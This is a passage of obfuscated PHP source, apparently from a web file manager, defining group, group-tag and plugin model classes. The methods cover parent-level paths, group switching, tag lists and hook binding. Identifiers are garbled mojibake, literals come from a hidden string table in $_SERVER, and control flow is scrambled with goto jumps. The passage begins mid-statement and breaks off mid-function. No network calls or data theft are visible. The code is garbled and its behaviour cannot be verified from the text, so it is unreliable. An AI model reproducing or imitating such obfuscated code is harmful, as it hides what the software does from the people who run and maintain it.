$_SERVER[›é¼±]; $AØß§’Ñğ = array_to_keyvalue($eß’ğÊ‘ºœ, $dÖ±Û‡öšõ[33], $dÖ±Û‡öšõ[1733]); $Eè¬³Ã«Ú« = array($dÖ±Û‡öšõ[492] => array($dÖ±Û‡öšõ[7], $AØß§’Ñğ)); goto EƒÑ§Ÿ ó•; EƒÑ§Ÿ ó•: $aß¾¥ÌÃ½ = array($dÖ±Û‡öšõ[492], $dÖ±Û‡öšõ[1827] => $dÖ±Û‡öšõ[494]); $BäµËÑ—¸ = $this->field($aß¾¥ÌÃ½)->where($Eè¬³Ã«Ú«)->group($dÖ±Û‡öšõ[492])->select(); $c­À™¶äÒÅ = array_to_keyvalue($BäµËÑ—¸, $dÖ±Û‡öšõ[492], $dÖ±Û‡öšõ[494]); goto a²’ª‹èÙ­; F²¶Ÿê©Š: } private function _listAppendChildrenMember(&$B÷Ğ©ÖÁèó) { goto DÙ‰ğç¢†¬; b£ì©‰ÜáÉ: $BŒòëğáÉ = array($BÜ–‹»ÓñÙ[1733], $BÜ–‹»ÓñÙ[1827] => $BÜ–‹»ÓñÙ[494]); $D×®£˜Çğ„ = Model($BÜ–‹»ÓñÙ[1819])->field($BŒòëğáÉ)->where($f¶—¿“Ï³à)->group($BÜ–‹»ÓñÙ[1733])->select(); $e³ÅÏİà¨ = array_to_keyvalue($D×®£˜Çğ„, $BÜ–‹»ÓñÙ[1733], $BÜ–‹»ÓñÙ[494]); goto f»¬†Ã½‚; f»¬†Ã½‚: foreach ($B÷Ğ©ÖÁèó as &$BšºÔïÕ²´) { $F¤ï¶ÛÓñµ = $BšºÔïÕ²´[$BÜ–‹»ÓñÙ[1733]]; $BšºÔïÕ²´[$BÜ–‹»ÓñÙ[1829]] = isset($e³ÅÏİà¨[$F¤ï¶ÛÓñµ]) ? intval($e³ÅÏİà¨[$F¤ï¶ÛÓñµ]) : !1; } unset($BšºÔïÕ²´); goto E†…»·’¯ª; DÙ‰ğç¢†¬: $BÜ–‹»ÓñÙ =& $_SERVER[›é¼±]; $cÃâÉ É¡ó = array_to_keyvalue($B÷Ğ©ÖÁèó, $BÜ–‹»ÓñÙ[33], $BÜ–‹»ÓñÙ[1733]); $f¶—¿“Ï³à = array($BÜ–‹»ÓñÙ[1733] => array($BÜ–‹»ÓñÙ[7], $cÃâÉ É¡ó)); goto b£ì©‰ÜáÉ; E†…»·’¯ª: } private function _listAppendMeta(&$EÃ”…Î, $aõá™Î²Š) { goto F®Œê×‘‚§; F®Œê×‘‚§: $C§§•›øê =& $_SERVER[›é¼±]; $E—ùÇïÚ¼¿ = array($C§§•›øê[1733] => array($C§§•›øê[7], $aõá™Î²Š)); $B´øÙ¼Ö = Model($C§§•›øê[1818])->where($E—ùÇïÚ¼¿)->select(); goto Aá¹Ôˆ­¤; Aá¹Ôˆ­¤: $B´øÙ¼Ö = array_to_keyvalue_group($B´øÙ¼Ö, $C§§•›øê[1733]); foreach ($B´øÙ¼Ö as &$b¹ÄğËÖ) { $b¹ÄğËÖ = array_to_keyvalue($b¹ÄğËÖ, $C§§•›øê[93], $C§§•›øê[372]); } unset($b¹ÄğËÖ); goto d·ÕÔºèÜ; d·ÕÔºèÜ: foreach ($EÃ”…Î as &$d˜©ËÍ) { $d˜©ËÍ[$C§§•›øê[459]] = array(); if (isset($B´øÙ¼Ö[$d˜©ËÍ[$C§§•›øê[1733]]])) { $d˜©ËÍ[$C§§•›øê[459]] = $B´øÙ¼Ö[$d˜©ËÍ[$C§§•›øê[1733]]]; } } unset($d˜©ËÍ); goto E­Éõ„ª½ô; E­Éõ„ª½ô: } protected function parentLevelArray($aŒ´âí¸Àœ) { $a²Ï…­êŞÓ =& $_SERVER[›é¼±]; $aŒ´âí¸Àœ = explode($a²Ï…­êŞÓ[47], trim($aŒ´âí¸Àœ, $a²Ï…­êŞÓ[47])); $aŒ´âí¸Àœ = array_remove_value($aŒ´âí¸Àœ, $a²Ï…­êŞÓ[191]); return $aŒ´âí¸Àœ; } private function _listAppendParent(&$D·Ëñ°ÉÓ–) { goto cŞï…‘ªï; B‘†œ¢ºñ¤: unset($F‹èÁ„†é£); foreach ($cÀ‹ŠË×† as $c©»ƒÒ’÷µ => $cŸÂ²¬ñÆè) { if ($cŸÂ²¬ñÆè) { continue; } $eÓÎø¦‰Ğ = $this->getInfoSimple($c©»ƒÒ’÷µ); $cÀ‹ŠË×†[$c©»ƒÒ’÷µ] = $eÓÎø¦‰Ğ[$aÄ‚Ö¹ì†ë[28]]; } $F÷š¡†å×÷ = $GLOBALS[$aÄ‚Ö¹ì†ë[6]][$aÄ‚Ö¹ì†ë[88]][$aÄ‚Ö¹ì†ë[1830]]; goto EÍÖëğˆ¶ç; cŞï…‘ªï: $aÄ‚Ö¹ì†ë =& $_SERVER[›é¼±]; $cÀ‹ŠË×† = array(); foreach ($D·Ëñ°ÉÓ– as &$F‹èÁ„†é£) { $cÀ‹ŠË×†[$F‹èÁ„†é£[$aÄ‚Ö¹ì†ë[1733]]] = $F‹èÁ„†é£[$aÄ‚Ö¹ì†ë[28]]; $AˆÕšÊ Ô = $this->parentLevelArray($F‹èÁ„†é£[$aÄ‚Ö¹ì†ë[515]]); foreach ($AˆÕšÊ Ô as $E«±¬£õœ) { if (!isset($cÀ‹ŠË×†[$E«±¬£õœ])) { $cÀ‹ŠË×†[$E«±¬£õœ] = 0; } } } goto B‘†œ¢ºñ¤; EÍÖëğˆ¶ç: if ($GLOBALS[$aÄ‚Ö¹ì†ë[499]] == $aÄ‚Ö¹ì†ë[87]) { $F÷š¡†å×÷ = !1; } foreach ($D·Ëñ°ÉÓ– as &$F‹èÁ„†é£) { $AˆÕšÊ Ô = $this->parentLevelArray($F‹èÁ„†é£[$aÄ‚Ö¹ì†ë[515]]); $eƒ†ğÇØÓ = $aÄ‚Ö¹ì†ë[33]; foreach ($AˆÕšÊ Ô as $c©»ƒÒ’÷µ => $E«±¬£õœ) { if ($F÷š¡†å×÷ && $c©»ƒÒ’÷µ == 0) { continue; } $eƒ†ğÇØÓ .= $cÀ‹ŠË×†[$E«±¬£õœ] . $aÄ‚Ö¹ì†ë[8]; } if ($AˆÕšÊ Ô) { $eƒ†ğÇØÓ .= $F‹èÁ„†é£[$aÄ‚Ö¹ì†ë[28]]; } $F‹èÁ„†é£[$aÄ‚Ö¹ì†ë[520]] = str_replace($aÄ‚Ö¹ì†ë[523], $aÄ‚Ö¹ì†ë[8], $eƒ†ğÇØÓ); } unset($F‹èÁ„†é£); goto e·¶º¼ĞŸ; e·¶º¼ĞŸ: } private function _listAppendSourceRoot(&$Cï‹¸Ù–¿, $E¼İšå¤ñ…) { goto dç“¢ïÇ‡; dç“¢ïÇ‡: $F¼“«Œ´Åµ =& $_SERVER[›é¼±]; $c¶®‡ƒé¤é = array($F¼“«Œ´Åµ[492] => 0, $F¼“«Œ´Åµ[498] => array($F¼“«Œ´Åµ[7], $E¼İšå¤ñ…), $F¼“«Œ´Åµ[406] => SourceModel::TYPE_GROUP); $Aåùò¹à—Ñ = Model($F¼“«Œ´Åµ[827])->order($F¼“«Œ´Åµ[1831])->field($F¼“«Œ´Åµ[1832]); goto CØÍ‘¯ßŒÒ; CØÍ‘¯ßŒÒ: $e’ÊË©¼‰¦ = $Aåùò¹à—Ñ->limit(count($E¼İšå¤ñ…))->where($c¶®‡ƒé¤é)->select(); $e’ÊË©¼‰¦ = array_to_keyvalue($e’ÊË©¼‰¦, $F¼“«Œ´Åµ[498]); $e’ÊË©¼‰¦ = array_remove_key($e’ÊË©¼‰¦, $F¼“«Œ´Åµ[498]); goto e…Í´É›¸à; e…Í´É›¸à: foreach ($Cï‹¸Ù–¿ as &$eÏéÂ–ºğé) { $eÏéÂ–ºğé[$F¼“«Œ´Åµ[85]] = $e’ÊË©¼‰¦[$eÏéÂ–ºğé[$F¼“«Œ´Åµ[1733]]] ? $e’ÊË©¼‰¦[$eÏéÂ–ºğé[$F¼“«Œ´Åµ[1733]]] : array(); } unset($eÏéÂ–ºğé); goto fçß ‰ã¾‘; fçß ‰ã¾‘: } protected function groupMerge($E¥éÜ°°à¸) { $E¥éÜ°°à¸ = array_values(array_unique($E¥éÜ°°à¸)); $E¦õŠòª©ø = array(); for ($A±­ƒí³µ” = 0; $A±­ƒí³µ” < count($E¥éÜ°°à¸); $A±­ƒí³µ”++) { $E´ª¾ŒÕ’Ä = !1; for ($A¼ÎÃã‚Á = 0; $A¼ÎÃã‚Á < count($E¥éÜ°°à¸); $A¼ÎÃã‚Á++) { if ($A±­ƒí³µ” == $A¼ÎÃã‚Á) { continue; } if ($this->isParentOf($E¥éÜ°°à¸[$A¼ÎÃã‚Á], $E¥éÜ°°à¸[$A±­ƒí³µ”])) { $E´ª¾ŒÕ’Ä = !0; break; } } if (!$E´ª¾ŒÕ’Ä) { $E¦õŠòª©ø[] = $E¥éÜ°°à¸[$A±­ƒí³µ”]; } } return $E¦õŠòª©ø; } protected function isParentOf($DŒ­§Ï®ë’, $d¬¢Ôˆ•³Ô) { goto FÌ±·ÅÀï; d½áØÉÈ‰ß: return !1; goto Fè³‰˜ó; FÌ±·ÅÀï: $EÅˆãÜêÃè =& $_SERVER[›é¼±]; if (!$DŒ­§Ï®ë’ || !$d¬¢Ôˆ•³Ô || $DŒ­§Ï®ë’ == $d¬¢Ôˆ•³Ô) { return !1; } $EŒÉåø¸ö¸ = $this->getInfoSimple($DŒ­§Ï®ë’); goto D½…†¡ŠÚ°; D½…†¡ŠÚ°: $FÇÈ¦‹äß½ = $this->getInfoSimple($d¬¢Ôˆ•³Ô); $d‹šÜØ©Ú‚ = $EŒÉåø¸ö¸[$EÅˆãÜêÃè[515]] . $DŒ­§Ï®ë’ . $EÅˆãÜêÃè[47]; if (substr($FÇÈ¦‹äß½[$EÅˆãÜêÃè[515]], 0, strlen($d‹šÜØ©Ú‚)) == $d‹šÜØ©Ú‚) { return !0; } goto d½áØÉÈ‰ß; Fè³‰˜ó: } public function groupShowRoot($E¸ŒäÉÙˆ‚, $aÜ²¢±…ãŞ = false) { goto díàİ”¶„½; eá¥ÖÒ©¢°: return $D«¡œ–Š“; goto c©ÄÊÏ×Âã; díàİ”¶„½: $e§Ğ²Ò³Ãô =& $_SERVER[›é¼±]; $D²îçàêæä = $this->getInfo($E¸ŒäÉÙˆ‚); if (!$D²îçàêæä) { return array(); } goto c®èÌ˜áâ§; fš»›Ğƒ: if ($aÜ²¢±…ãŞ && count($cÂ‰ËŒ†ŒÒ) == 1) { return $D«¡œ–Š“; } if (!$D²îçàêæä[$e§Ğ²Ò³Ãô[459]] || !isset($D²îçàêæä[$e§Ğ²Ò³Ãô[459]][$e§Ğ²Ò³Ãô[1815]]) || $D²îçàêæä[$e§Ğ²Ò³Ãô[459]][$e§Ğ²Ò³Ãô[1815]] == $e§Ğ²Ò³Ãô[1787]) { return $this->groupShowRoot($cÂ‰ËŒ†ŒÒ[count($cÂ‰ËŒ†ŒÒ) - 1], $aÜ²¢±…ãŞ); } if ($D²îçàêæä[$e§Ğ²Ò³Ãô[459]][$e§Ğ²Ò³Ãô[1815]] == $e§Ğ²Ò³Ãô[355]) { $C Æä×ËÈ… = explode($e§Ğ²Ò³Ãô[47], $D²îçàêæä[$e§Ğ²Ò³Ãô[459]][$e§Ğ²Ò³Ãô[1816]]); if ($C Æä×ËÈ…) { $D«¡œ–Š“ = array_merge($D«¡œ–Š“, $C Æä×ËÈ…); } } goto eá¥ÖÒ©¢°; c®èÌ˜áâ§: $cÂ‰ËŒ†ŒÒ = $this->parentLevelArray($D²îçàêæä[$e§Ğ²Ò³Ãô[515]]); $D«¡œ–Š“ = array($E¸ŒäÉÙˆ‚); if (count($cÂ‰ËŒ†ŒÒ) == 0) { return $D«¡œ–Š“; } goto fš»›Ğƒ; c©ÄÊÏ×Âã: } protected function resetParentLevel() { $a•«÷¥½ =& $_SERVER[›é¼±]; $eÊ’–­¿¥’ = $a•«÷¥½[1733]; $FË‡÷ÃÄ = $this->select(); $FË‡÷ÃÄ = array_to_keyvalue($FË‡÷ÃÄ, $eÊ’–­¿¥’); foreach ($FË‡÷ÃÄ as $dÀŒ½§âÀ®) { goto eÏ†ßò ŸÀ; eÏ†ßò ŸÀ: $c¥ğá¨­Ìº = $dÀŒ½§âÀ®; $EšŠÒÒ¬î = array(); while ($c¥ğá¨­Ìº[$a•«÷¥½[492]] != 0) { $EšŠÒÒ¬î[] = $c¥ğá¨­Ìº[$a•«÷¥½[492]]; $c¥ğá¨­Ìº = $FË‡÷ÃÄ[$c¥ğá¨­Ìº[$a•«÷¥½[492]]]; } goto aëÙ³ÍÅç; aëÙ³ÍÅç: $EšŠÒÒ¬î[] = 0; $EšŠÒÒ¬î = $a•«÷¥½[47] . implode($a•«÷¥½[47], array_reverse($EšŠÒÒ¬î)) . $a•«÷¥½[47]; $this->setNamePinyin($dÀŒ½§âÀ®[$eÊ’–­¿¥’], $dÀŒ½§âÀ®[$a•«÷¥½[28]]); goto dİëğáå“Ô; dİëğáå“Ô: $this->where(array($eÊ’–­¿¥’ => $dÀŒ½§âÀ®[$eÊ’–­¿¥’]))->save(array($a•«÷¥½[578] => $EšŠÒÒ¬î)); goto CÔÆÉè¨ŸØ; CÔÆÉè¨ŸØ: } return $FË‡÷ÃÄ; } public function groupNameAuto($a±²šÌœµ¦, $B›¤¿²‰¼º) { $Cë¤Êáï³± =& $_SERVER[›é¼±]; $aòŞºöÓ = $this->where(array($Cë¤Êáï³±[396] => $a±²šÌœµ¦))->getField($Cë¤Êáï³±[28], !0); if (!$aòŞºöÓ || !in_array($B›¤¿²‰¼º, $aòŞºöÓ)) { return $B›¤¿²‰¼º; } for ($fšòç¡© = 1; $fšòç¡© <= count($aòŞºöÓ) + 1; $fšòç¡©++) { $AÖâ¨Ò³¦Õ = $B›¤¿²‰¼º . "\50{$fšòç¡©}\x29"; if (!in_array($AÖâ¨Ò³¦Õ, $aòŞºöÓ)) { return $AÖâ¨Ò³¦Õ; } } } public function groupSwitch($ešå¡‚îÛ, $C¢ÀÔöØè) { goto CÀ¸¤¨ÃÌÔ; CÀ¸¤¨ÃÌÔ: $fÅç™×µÂ =& $_SERVER[›é¼±]; $Dõ®‘©ŠôØ = array($fÅç™×µÂ[1733] => array($fÅç™×µÂ[7], array($ešå¡‚îÛ, $C¢ÀÔöØè))); $CèÛ…±Š‘Š = $this->where($Dõ®‘©ŠôØ)->select(); goto eâºåé³¾; eâºåé³¾: $CèÛ…±Š‘Š = array_to_keyvalue($CèÛ…±Š‘Š, $fÅç™×µÂ[1733]); if (!isset($CèÛ…±Š‘Š[$ešå¡‚îÛ]) || !isset($CèÛ…±Š‘Š[$C¢ÀÔöØè]) || $CèÛ…±Š‘Š[$ešå¡‚îÛ][$fÅç™×µÂ[492]] == 0) { return !1; } $Dõ®‘©ŠôØ = array($fÅç™×µÂ[1733] => $ešå¡‚îÛ); goto a‘’¢ò‰Ó; f³Ñ¯“Ş¤: $this->where(array($fÅç™×µÂ[492] => $ešå¡‚îÛ))->save(array($fÅç™×µÂ[492] => $C¢ÀÔöØè)); $this->_clearChildrenCache($CèÛ…±Š‘Š[$C¢ÀÔöØè]); return !0; goto B–Úè†¨îŠ; C‘Òæ«àŸ: $FŒ†æ™ø½ = !empty($D’²ÙÀªõ[$ešå¡‚îÛ]) ? $D’²ÙÀªõ[$ešå¡‚îÛ] : !1; if ($FŒ†æ™ø½) { goto cÅÏà…Š”; cÅÏà…Š”: if (!$D’²ÙÀªõ[$C¢ÀÔöØè]) { $D’²ÙÀªõ[$C¢ÀÔöØè] = Model($fÅç™×µÂ[827])->groupRootAdd($C¢ÀÔöØè); } $AÊìŠ”œ = $D’²ÙÀªõ[$C¢ÀÔöØè]; $Dõ®‘©ŠôØ = array($fÅç™×µÂ[492] => $FŒ†æ™ø½); goto C‰“á­ä°; eõÊ†İ”÷ì: foreach ($D’²ÙÀªõ as $DàòâŠ•·É) { $E´Ëä…­µˆ = $DàòâŠ•·É[$fÅç™×µÂ[405]] == $fÅç™×µÂ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($fÅç™×µÂ[827])->move($DàòâŠ•·É[$fÅç™×µÂ[397]], $AÊìŠ”œ, $E´Ëä…­µˆ); } Model($fÅç™×µÂ[827])->moveClearAuth = !0; $Dõ®‘©ŠôØ = array($fÅç™×µÂ[406] => 2, $fÅç™×µÂ[498] => $ešå¡‚îÛ); goto DŒø­ø„¿•; C‰“á­ä°: $D’²ÙÀªõ = Model($fÅç™×µÂ[827])->where($Dõ®‘©ŠôØ)->field($fÅç™×µÂ[1835])->select(); if (!$D’²ÙÀªõ) { $D’²ÙÀªõ = array(); } Model($fÅç™×µÂ[827])->moveClearAuth = !1; goto eõÊ†İ”÷ì; DŒø­ø„¿•: $C‚ïÈ¢ïó = array($fÅç™×µÂ[498] => $C¢ÀÔöØè); Model($fÅç™×µÂ[1836])->where($Dõ®‘©ŠôØ)->save($C‚ïÈ¢ïó); Model($fÅç™×µÂ[1837])->where($Dõ®‘©ŠôØ)->save($C‚ïÈ¢ïó); goto aĞ‘ÖÉ„òä; aĞ‘ÖÉ„òä: } $this->_changeChildLevel($CèÛ…±Š‘Š[$ešå¡‚îÛ], $CèÛ…±Š‘Š[$C¢ÀÔöØè], !0); goto f³Ñ¯“Ş¤; a‘’¢ò‰Ó: $f÷µ†åÓ ç = Model($fÅç™×µÂ[1819])->where($Dõ®‘©ŠôØ)->select(); if (!$f÷µ†åÓ ç) { $f÷µ†åÓ ç = array(); } foreach ($f÷µ†åÓ ç as $dùëù¸õ¢…) { $BÎ‡©î“À… = $dùëù¸õ¢…[$fÅç™×µÂ[1564]]; $Dõ®‘©ŠôØ = array($fÅç™×µÂ[1564] => $BÎ‡©î“À…, $fÅç™×µÂ[1733] => $C¢ÀÔöØè); $dÕÁ…ë®²Ï = Model($fÅç™×µÂ[1819])->where($Dõ®‘©ŠôØ)->find(); if (!$dÕÁ…ë®²Ï) { $aÉ¯ó­…› = array($C¢ÀÔöØè => $dùëù¸õ¢…[$fÅç™×µÂ[1833]]); Model($fÅç™×µÂ[532])->userGroupAdd($BÎ‡©î“À…, $aÉ¯ó­…›); } Model($fÅç™×µÂ[532])->userGroupRemove($BÎ‡©î“À…, $ešå¡‚îÛ); } goto FÑš›ÛäéÛ; FÑš›ÛäéÛ: $Dõ®‘©ŠôØ = array($fÅç™×µÂ[406] => 2, $fÅç™×µÂ[492] => 0, $fÅç™×µÂ[405] => 1, $fÅç™×µÂ[498] => array($fÅç™×µÂ[7], array($ešå¡‚îÛ, $C¢ÀÔöØè))); $D’²ÙÀªõ = Model($fÅç™×µÂ[827])->where($Dõ®‘©ŠôØ)->field($fÅç™×µÂ[1834])->select(); $D’²ÙÀªõ = array_to_keyvalue($D’²ÙÀªõ, $fÅç™×µÂ[498], $fÅç™×µÂ[397]); goto C‘Òæ«àŸ; B–Úè†¨îŠ: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($e‡æî»Şæ™) { $Bº¯¬Ê­ÜÖ =& $_SERVER[›é¼±]; return array($Bº¯¬Ê­ÜÖ[1838] => array($e‡æî»Şæ™[0], $Bº¯¬Ê­ÜÖ[1839]), $Bº¯¬Ê­ÜÖ[1840] => array($e‡æî»Şæ™[0], $Bº¯¬Ê­ÜÖ[1841])); } protected function get($Dà·ÊŠä¹‰) { $dªŒ‡î‘İ§ =& $_SERVER[›é¼±]; $B„·âéö® = Model($dªŒ‡î‘İ§[516])->metaGet($Dà·ÊŠä¹‰, $dªŒ‡î‘İ§[1842]); $e˜İ»áÛãğ = json_decode($B„·âéö®, !0); return $e˜İ»áÛãğ ? $e˜İ»áÛãğ : array($dªŒ‡î‘İ§[1843] => $dªŒ‡î‘İ§[87], $dªŒ‡î‘İ§[367] => array()); } protected function set($cğ¦Šä®³Ù, $Bå·ïÅïä) { $F£ßğô„Û” =& $_SERVER[›é¼±]; $Bå·ïÅïä = $Bå·ïÅïä ? $Bå·ïÅïä : array($F£ßğô„Û”[1843] => $F£ßğô„Û”[87], $F£ßğô„Û”[367] => array()); Model($F£ßğô„Û”[516])->metaSet($cğ¦Šä®³Ù, $F£ßğô„Û”[1842], json_encode($Bå·ïÅïä)); return Model($F£ßğô„Û”[516])->metaSet($cğ¦Šä®³Ù, $F£ßğô„Û”[1842], json_encode($Bå·ïÅïä)); } protected function getByTagID($f™˜‘µ¯¿«, $a®÷ÚÙˆ¬) { goto c‰ÈÚâƒ‡; Eã‰§¾ö¹½: $BÕé÷áŸØø = $this->get($f™˜‘µ¯¿«); if (!$BÕé÷áŸØø || !isset($BÕé÷áŸØø[$A‘À‡ßÛ¸Ä[367]])) { return !1; } $c˜³è°Û‘‹ = array_find_by_field($BÕé÷áŸØø[$A‘À‡ßÛ¸Ä[367]], $A‘À‡ßÛ¸Ä[395], $a®÷ÚÙˆ¬); goto eÀñ”½âß¢; eÀñ”½âß¢: return is_array($c˜³è°Û‘‹) ? $c˜³è°Û‘‹ : !1; goto cæ”ˆ­ÁÃ; c‰ÈÚâƒ‡: $A‘À‡ßÛ¸Ä =& $_SERVER[›é¼±]; if (!$f™˜‘µ¯¿« || !$a®÷ÚÙˆ¬) { return !1; } if (!Model($A‘À‡ßÛ¸Ä[516])->getInfoSimple($f™˜‘µ¯¿«)) { return !1; } goto Eã‰§¾ö¹½; cæ”ˆ­ÁÃ: } public function listSource($BöĞ…ôøÀ, $DÔù„‚¾) { goto f÷­‰’¼©×; f÷­‰’¼©×: $a»ˆÀ¥Œ‘í =& $_SERVER[›é¼±]; if ($DÔù„‚¾ && !is_array($DÔù„‚¾)) { $DÔù„‚¾ = array($DÔù„‚¾); } $BùàëÜ®³¿ = $this->listData($BöĞ…ôøÀ); goto F‹õ‡‹´Õ“; BØÀ­ˆ¤Ş¬: foreach ($D«‚ÃÃ±òî as $cÈÂëÁ·å¡) { if (!in_array($cÈÂëÁ·å¡, $EÅÙíØæÚ)) { $AÄÜÓ­©Ò²[] = $cÈÂëÁ·å¡; } } if ($AÄÜÓ­©Ò²) { $this->removeBySource($BöĞ…ôøÀ, $AÄÜÓ­©Ò²); } return $Dó¤ØšÉŠ‹; goto A›×Æ°†´‹; C­¥ªÍ»öã: $AĞÕğÔ˜…· = array_to_keyvalue($Dó¤ØšÉŠ‹[$a»ˆÀ¥Œ‘í[75]], $a»ˆÀ¥Œ‘í[33], $a»ˆÀ¥Œ‘í[397]); $Eè®Ğ×‡ô¢ = array_to_keyvalue($Dó¤ØšÉŠ‹[$a»ˆÀ¥Œ‘í[74]], $a»ˆÀ¥Œ‘í[33], $a»ˆÀ¥Œ‘í[397]); $EÅÙíØæÚ = array_merge($Eè®Ğ×‡ô¢, $AĞÕğÔ˜…·); goto BØÀ­ˆ¤Ş¬; D‚‰©èÉ«Ô: foreach ($dø×ÀÉ»Õ” as $fÚÓ”õµŞô => $eĞĞÜĞÚÏò) { $eÆ²«çˆÂ· = !0; if (!$DÔù„‚¾) { $D«‚ÃÃ±òî[] = $fÚÓ”õµŞô; continue; } foreach ($DÔù„‚¾ as $fä…ğœùøœ) { if (!in_array($fä…ğœùøœ, $eĞĞÜĞÚÏò)) { $eÆ²«çˆÂ· = !1; break; } } if ($eÆ²«çˆÂ·) { $D«‚ÃÃ±òî[] = $fÚÓ”õµŞô; } } if (!$D«‚ÃÃ±òî) { return array(); } $AÅ•º×åŸ = array($a»ˆÀ¥Œ‘í[412] => array($a»ˆÀ¥Œ‘í[413], $D«‚ÃÃ±òî), $a»ˆÀ¥Œ‘í[498] => $BöĞ…ôøÀ, $a»ˆÀ¥Œ‘í[406] => SourceModel::TYPE_GROUP); goto F¿ªñ›ë‘Ì; F¿ªñ›ë‘Ì: $Dó¤ØšÉŠ‹ = Model($a»ˆÀ¥Œ‘í[1239])->listSource($AÅ•º×åŸ); if (!$Dó¤ØšÉŠ‹ || count($D«‚ÃÃ±òî) == $Dó¤ØšÉŠ‹[$a»ˆÀ¥Œ‘í[364]][$a»ˆÀ¥Œ‘í[365]]) { return $Dó¤ØšÉŠ‹; } $AÄÜÓ­©Ò² = array(); goto C­¥ªÍ»öã; F‹õ‡‹´Õ“: $dø×ÀÉ»Õ” = array(); foreach ($BùàëÜ®³¿ as $b¡ƒ¾–ç») { $cÈÂëÁ·å¡ = $b¡ƒ¾–ç»[$a»ˆÀ¥Œ‘í[76]]; if (!$cÈÂëÁ·å¡) { continue; } if (!isset($dø×ÀÉ»Õ”[$cÈÂëÁ·å¡])) { $dø×ÀÉ»Õ”[$cÈÂëÁ·å¡] = array(); } $dø×ÀÉ»Õ”[$cÈÂëÁ·å¡][] = $b¡ƒ¾–ç»[$a»ˆÀ¥Œ‘í[421]]; } $D«‚ÃÃ±òî = array(); goto D‚‰©èÉ«Ô; A›×Æ°†´‹: } protected function listData($däŒñ˜–Òƒ) { $fƒë”¾†—› =& $_SERVER[›é¼±]; $b¥Ö™›Òù = array($fƒë”¾†—›[1555] => 0, $fƒë”¾†—›[477] => array($fƒë”¾†—›[1844], 0), $fƒë”¾†—›[417] => $fƒë”¾†—›[1845] . $däŒñ˜–Òƒ); $fç±±¾ç¸½ = $fƒë”¾†—›[1846]; $F‰Ü“´¾ = $this->field($fç±±¾ç¸½)->where($b¥Ö™›Òù)->order($fƒë”¾†—›[1847])->select(); return $F‰Ü“´¾ ? $F‰Ü“´¾ : array(); } protected function addToTag($EàŸÅáİÒ¢, $b˜²‡™Áêâ, $eäğ±¡™ô) { $E··—½©»Œ =& $_SERVER[›é¼±]; if (!$this->getByTagID($EàŸÅáİÒ¢, $eäğ±¡™ô) || !$b˜²‡™Áêâ) { return !1; } if (!Model($E··—½©»Œ[827])->pathInfo($b˜²‡™Áêâ)) { return !1; } $dÈøÏŸ¤‹ = array($E··—½©»Œ[1555] => 0, $E··—½©»Œ[477] => $eäğ±¡™ô, $E··—½©»Œ[416] => $b˜²‡™Áêâ, $E··—½©»Œ[417] => $E··—½©»Œ[1848] . $EàŸÅáİÒ¢, $E··—½©»Œ[415] => $E··—½©»Œ[33], $E··—½©»Œ[1737] => 0); if ($this->where($dÈøÏŸ¤‹)->find()) { return !1; } return $this->add($dÈøÏŸ¤‹); } protected function removeFromTag($a¨œÇâÜø„, $cÑ–Å‚ö, $cç­Ïµ¥˜İ) { $BââÒã± =& $_SERVER[›é¼±]; if (!$this->getByTagID($a¨œÇâÜø„, $cç­Ïµ¥˜İ) || !$cÑ–Å‚ö) { return !1; } if (is_array($cÑ–Å‚ö)) { $cÑ–Å‚ö = array($BââÒã±[7], $cÑ–Å‚ö); } $fì½ÏÍ¸ò = array($BââÒã±[1555] => 0, $BââÒã±[477] => $cç­Ïµ¥˜İ, $BââÒã±[417] => $BââÒã±[1848] . $a¨œÇâÜø„, $BââÒã±[416] => $cÑ–Å‚ö); return $this->where($fì½ÏÍ¸ò)->delete(); } protected function removeByTag($A‰ùˆ°àá¦, $bÕ½µ¶Œ°) { $f¹ÅçïÑÒ =& $_SERVER[›é¼±]; if (!$this->getByTagID($A‰ùˆ°àá¦, $bÕ½µ¶Œ°)) { return !1; } $bœŠÓ¤Õ£­ = array($f¹ÅçïÑÒ[1555] => 0, $f¹ÅçïÑÒ[477] => $bÕ½µ¶Œ°, $f¹ÅçïÑÒ[417] => $f¹ÅçïÑÒ[1848] . $A‰ùˆ°àá¦); return $this->where($bœŠÓ¤Õ£­)->delete(); } protected function removeBySource($Cí¤À„¿å…, $cßÙ«òóÕæ) { $dø·ôÊŞĞ =& $_SERVER[›é¼±]; if (!$Cí¤À„¿å… || !$cßÙ«òóÕæ) { return !1; } if (is_array($cßÙ«òóÕæ)) { $cßÙ«òóÕæ = array($dø·ôÊŞĞ[7], $cßÙ«òóÕæ); } $AˆÍ†âóœ» = array($dø·ôÊŞĞ[1555] => 0, $dø·ôÊŞĞ[416] => $cßÙ«òóÕæ, $dø·ôÊŞĞ[477] => array($dø·ôÊŞĞ[1006], 0), $dø·ôÊŞĞ[417] => $dø·ôÊŞĞ[1848] . $Cí¤À„¿å…); return $this->where($AˆÍ†âóœ»)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\160\154\165\147\151\x6e\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\x73\x74\x61\164\x75\163", "\x72\145\147\151\x65\x73\x74", "\143\x6f\x6e\146\x69\x67"); public function loadList($EóÀÒ”–”¶ = false) { $bé“²’„ØÅ = array_to_keyvalue($this->listData(), $_SERVER[›é¼±][28]); if ($EóÀÒ”–”¶) { return $bé“²’„ØÅ[$EóÀÒ”–”¶]; } return $bé“²’„ØÅ; } public function init() { $FÍ‘éª¼Àğ =& $_SERVER[›é¼±]; Hook::trigger($FÍ‘éª¼Àğ[1849]); $f–ÙñÀ¼ÄÔ = $this->loadPluginList(); foreach ($f–ÙñÀ¼ÄÔ as $cí¸±Í—«¬ => $AÄÄØ‘‡Ì) { $E Û¼®ãƒí = $this->appAllow($cí¸±Í—«¬, $AÄÄØ‘‡Ì); if (!$E Û¼®ãƒí) { continue; } foreach ($AÄÄØ‘‡Ì[$FÍ‘éª¼Àğ[1850]] as $f±¥Ì†Ãµ“ => $BŠ¸Üï‰«¥) { Hook::bind($f±¥Ì†Ãµ“, $BŠ¸Üï‰«¥); } } Hook::trigger($FÍ‘éª¼Àğ[1851]); Hook::trigger(ACTION); } public function appAllow($f°ŸÊ·Ã±Á, $DÒ÷¢’, $Ağ²‰™òŞà = true) { $E•ê›ğô =& $_SERVER[›é¼±]; $CŸ Åùõéé = PLUGIN_DIR . $f°ŸÊ·Ã±Á . $E•ê›ğô[1852]; if (!is_array($DÒ÷¢’) || 